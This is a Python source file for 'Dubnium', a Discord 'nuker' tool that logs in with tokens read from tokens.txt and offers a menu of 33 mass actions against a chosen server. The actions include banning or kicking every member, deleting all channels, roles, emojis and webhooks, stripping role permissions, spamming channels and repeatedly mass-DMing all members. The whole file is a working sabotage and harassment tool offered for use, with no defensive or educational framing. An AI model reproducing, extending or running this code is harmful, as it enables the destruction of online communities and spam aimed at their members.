import discord
from discord.ext import commands
import asyncio
import colorama
from colorama import Fore, Style
import random
import os

colorama.init()

# Gradient Function
def hex_to_rgb(hex_color):
    hex_color = hex_color.lstrip('#')
    return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

def rgb_to_256(r, g, b):
    return 16 + 36 * round(r / 255 * 5) + 6 * round(g / 255 * 5) + round(b / 255 * 5)

def color_gradient(text, start_color, end_color):
    r1, g1, b1 = start_color
    r2, g2, b2 = end_color
    text_length = len(text)
    output = ""
    for i, char in enumerate(text):
        t = i / (text_length - 1) if text_length > 1 else 0
        r = round(r1 + (r2 - r1) * t)
        g = round(g1 + (g2 - g1) * t)
        b = round(b1 + (b2 - b1) * t)
        color_256 = rgb_to_256(r, g, b)
        output += f"\033[38;5;{color_256}m{char}"
    output += Style.RESET_ALL
    return output

# ASCII Art
ASCII_ART = color_gradient("""
██████████              █████                 ███                            
░░███░░░░███            ░░███                 ░░░                             
 ░███   ░░███ █████ ████ ░███████  ████████   ████  █████ ████ █████████████  
 ░███    ░███░░███ ░███  ░███░░███░░███░░███ ░░███ ░░███ ░███ ░░███░░███░░███ 
 ░███    ░███ ░███ ░███  ░███ ░███ ░███ ░███  ░███  ░███ ░███  ░███ ░███ ░███ 
 ░███    ███  ░███ ░███  ░███ ░███ ░███ ░███  ░███  ░███ ░███  ░███ ░███ ░███ 
███████████   ░░████████ ████████  ████ █████ █████ ░░████████ █████░███ █████
░░░░░░░░░░     ░░░░░░░░ ░░░░░░░░  ░░░░ ░░░░░ ░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░ 
""", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))

# Load tokens from tokens.txt
def load_tokens():
    if not os.path.exists("tokens.txt"):
        print(color_gradient("[ERROR] tokens.txt not found!", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        exit()
    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()
    return tokens

# Dubnium Nuker
class Dubnium:
    def __init__(self, token):
        self.token = token
        intents = discord.Intents.default()
        intents.members = True  # Enable member intents
        self.bot = commands.Bot(command_prefix="!", intents=intents)
        self.setup_events()

    def setup_events(self):
        @self.bot.event
        async def on_ready():
            print(color_gradient(f"[+] Logged in as {self.bot.user}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            await self.select_server()

    async def select_server(self):
        print(color_gradient("\n=== Available Servers ===", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        for i, guild in enumerate(self.bot.guilds):
            print(color_gradient(f"{i + 1}. {guild.name} (ID: {guild.id})", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        choice = input(color_gradient("\n[+] Select a server by number (or 0 to exit): ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        if choice == "0":
            print(color_gradient("[+] Exiting...", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            await self.bot.close()
            return
        try:
            guild = self.bot.guilds[int(choice) - 1]
            await self.show_menu(guild)
        except (IndexError, ValueError):
            print(color_gradient("[-] Invalid choice!", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            await self.select_server()

    async def show_menu(self, guild):
        print(color_gradient("\n==========================================================================================================================", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("1. Change Guild Name                    12. Spam Channels                     23. Export Role List", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("2. Nickname All Members               13. Shuffle Channels                    24. Slowmode All Channels", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("3. Ban All Members                    14. Unban Members                       25. Lock All Channels", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("4. Kick All Members                    15. Rename Channels                    26. Unlock All Channels", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("5. Unban All Members                   16. Mass DM All Members                27. Spam Reactions", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("6. Prune Members                     17. Delete All Webhooks                  28. Delete All Pins", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("7. Create Channels                   18. Change Guild Icon                    29. Change Role Permissions", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("8. Create Roles                      19. Change Guild Region                  30. Spam Roles", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("9. Delete Channels                  20. Change Guild Verification Level       31. Rename All Roles", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("10. Delete Roles                     21. Export Member List                   32. Create Invites", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("11. Delete Emojis                    22. Export Channel List                  33. Delete All Invites", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("==========================================================================================================================", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("0. Exit", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        print(color_gradient("\nMADE BY hausemaster__, Edited by TTT", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        choice = input(color_gradient("\n[+] Choose an option (0-33): ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        if choice == "0":
            print(color_gradient("[+] Exiting...", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            await self.bot.close()
            return
        await self.handle_choice(guild, choice)

    async def handle_choice(self, guild, choice):
        if choice == "1":
            new_name = input(color_gradient("[+] Enter new guild name: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            await guild.edit(name=new_name)
            print(color_gradient(f"[+] Guild name changed to {new_name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "2":
            new_nick = input(color_gradient("[+] Enter new nickname for all members: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            for member in guild.members:
                try:
                    await member.edit(nick=new_nick)
                    print(color_gradient(f"[+] Nicknamed {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to nickname {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "3":
            for member in guild.members:
                if member != self.bot.user and member != guild.owner:
                    try:
                        await member.ban()
                        print(color_gradient(f"[+] Banned {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                    except:
                        print(color_gradient(f"[-] Failed to ban {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "4":
            for member in guild.members:
                if member != self.bot.user and member != guild.owner:
                    try:
                        await member.kick()
                        print(color_gradient(f"[+] Kicked {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                    except:
                        print(color_gradient(f"[-] Failed to kick {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "5":
            banned_users = await guild.bans()
            for ban_entry in banned_users:
                try:
                    await guild.unban(ban_entry.user)
                    print(color_gradient(f"[+] Unbanned {ban_entry.user.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to unban {ban_entry.user.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "6":
            days = int(input(color_gradient("[+] Enter number of days to prune: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))))
            pruned = await guild.prune_members(days=days)
            print(color_gradient(f"[+] Pruned {pruned} members", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "7":
            num_channels = int(input(color_gradient("[+] Enter number of channels to create: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))))
            for i in range(num_channels):
                await guild.create_text_channel(f"nuked-channel-{i}")
                await guild.create_voice_channel(f"nuked-voice-{i}")
            print(color_gradient(f"[+] Created {num_channels} text and voice channels", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "8":
            num_roles = int(input(color_gradient("[+] Enter number of roles to create: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))))
            for i in range(num_roles):
                await guild.create_role(name=f"nuked-role-{i}", color=discord.Color.random())
            print(color_gradient(f"[+] Created {num_roles} roles", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "9":
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(color_gradient(f"[+] Deleted channel {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to delete channel {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "10":
            for role in guild.roles:
                if role.name != "@everyone" and role.position < guild.me.top_role.position:
                    try:
                        await role.delete()
                        print(color_gradient(f"[+] Deleted role {role.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                    except:
                        print(color_gradient(f"[-] Failed to delete role {role.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "11":
            for emoji in guild.emojis:
                try:
                    await emoji.delete()
                    print(color_gradient(f"[+] Deleted emoji {emoji.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to delete emoji {emoji.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "12":
            message = input(color_gradient("[+] Enter spam message: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            for channel in guild.text_channels:
                try:
                    for _ in range(10):  # Spam 10 messages per channel
                        await channel.send(message)
                    print(color_gradient(f"[+] Spammed {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to spam {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "13":
            channels = guild.channels
            random.shuffle(channels)
            for i, channel in enumerate(channels):
                try:
                    await channel.edit(position=i)
                    print(color_gradient(f"[+] Shuffled channels", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to shuffle channels", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "14":
            banned_users = await guild.bans()
            for ban_entry in banned_users:
                try:
                    await guild.unban(ban_entry.user)
                    print(color_gradient(f"[+] Unbanned {ban_entry.user.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to unban {ban_entry.user.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "15":
            new_name = input(color_gradient("[+] Enter new channel name: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            for channel in guild.channels:
                try:
                    await channel.edit(name=new_name)
                    print(color_gradient(f"[+] Renamed {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to rename {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "16":
            message = input(color_gradient("[+] Enter DM message: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            count = int(input(color_gradient("[+] Enter number of times to DM each user: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))))
            for member in guild.members:
                try:
                    for _ in range(count):
                        await member.send(message)
                    print(color_gradient(f"[+] DM sent to {member.name} {count} times", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to DM {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "17":
            for channel in guild.text_channels:
                try:
                    webhooks = await channel.webhooks()
                    for webhook in webhooks:
                        await webhook.delete()
                        print(color_gradient(f"[+] Deleted webhook in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to delete webhooks in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "18":
            new_icon = input(color_gradient("[+] Enter path to new icon: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            with open(new_icon, "rb") as image:
                await guild.edit(icon=image.read())
            print(color_gradient(f"[+] Changed guild icon", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "19":
            new_region = input(color_gradient("[+] Enter new region: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            await guild.edit(region=new_region)
            print(color_gradient(f"[+] Changed guild region to {new_region}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "20":
            new_verification_level = input(color_gradient("[+] Enter new verification level (0-4): ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            await guild.edit(verification_level=int(new_verification_level))
            print(color_gradient(f"[+] Changed guild verification level to {new_verification_level}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "21":
            with open("members.txt", "w") as f:
                for member in guild.members:
                    f.write(f"{member.name} (ID: {member.id})\n")
            print(color_gradient(f"[+] Exported member list to members.txt", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "22":
            with open("channels.txt", "w") as f:
                for channel in guild.channels:
                    f.write(f"{channel.name} (ID: {channel.id})\n")
            print(color_gradient(f"[+] Exported channel list to channels.txt", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "23":
            with open("roles.txt", "w") as f:
                for role in guild.roles:
                    f.write(f"{role.name} (ID: {role.id})\n")
            print(color_gradient(f"[+] Exported role list to roles.txt", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "24":
            duration = int(input(color_gradient("[+] Enter slowmode duration (in seconds): ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))))
            for channel in guild.text_channels:
                try:
                    await channel.edit(slowmode_delay=duration)
                    print(color_gradient(f"[+] Set slowmode in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to set slowmode in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "25":
            for channel in guild.text_channels:
                try:
                    await channel.set_permissions(guild.default_role, send_messages=False)
                    print(color_gradient(f"[+] Locked {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to lock {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "26":
            for channel in guild.text_channels:
                try:
                    await channel.set_permissions(guild.default_role, send_messages=True)
                    print(color_gradient(f"[+] Unlocked {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to unlock {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "27":
            reaction = input(color_gradient("[+] Enter reaction emoji: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            for channel in guild.text_channels:
                try:
                    async for message in channel.history(limit=100):
                        await message.add_reaction(reaction)
                    print(color_gradient(f"[+] Added reactions in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to add reactions in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "28":
            for channel in guild.text_channels:
                try:
                    await channel.purge(pinned=True)
                    print(color_gradient(f"[+] Deleted pins in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to delete pins in {channel.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "29":
            for role in guild.roles:
                try:
                    await role.edit(permissions=discord.Permissions.none())
                    print(color_gradient(f"[+] Removed permissions for {role.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to remove permissions for {role.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "30":
            num_roles = int(input(color_gradient("[+] Enter number of roles to add to each member: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))))
            roles = random.sample(guild.roles, num_roles)
            for member in guild.members:
                try:
                    await member.add_roles(*roles)
                    print(color_gradient(f"[+] Added roles to {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to add roles to {member.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "31":
            new_name = input(color_gradient("[+] Enter new role name: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
            for role in guild.roles:
                try:
                    await role.edit(name=new_name)
                    print(color_gradient(f"[+] Renamed {role.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to rename {role.name}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "32":
            num_invites = int(input(color_gradient("[+] Enter number of invites to create: ", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7"))))
            for _ in range(num_invites):
                try:
                    invite = await guild.text_channels[0].create_invite()
                    print(color_gradient(f"[+] Created invite: {invite.url}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to create invite", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        elif choice == "33":
            for invite in await guild.invites():
                try:
                    await invite.delete()
                    print(color_gradient(f"[+] Deleted invite: {invite.url}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
                except:
                    print(color_gradient(f"[-] Failed to delete invite: {invite.url}", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        else:
            print(color_gradient("[-] Invalid choice!", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))
        await self.show_menu(guild)

    def run(self):
        try:
            self.bot.run(self.token)
        except discord.errors.LoginFailure:
            print(color_gradient("[-] Invalid token! Check tokens.txt.", hex_to_rgb("#A3C9E2"), hex_to_rgb("#9618F7")))

# Main
if __name__ == "__main__":
    print(ASCII_ART)
    tokens = load_tokens()
    for token in tokens:
        dubnium = Dubnium(token)
        dubnium.run()
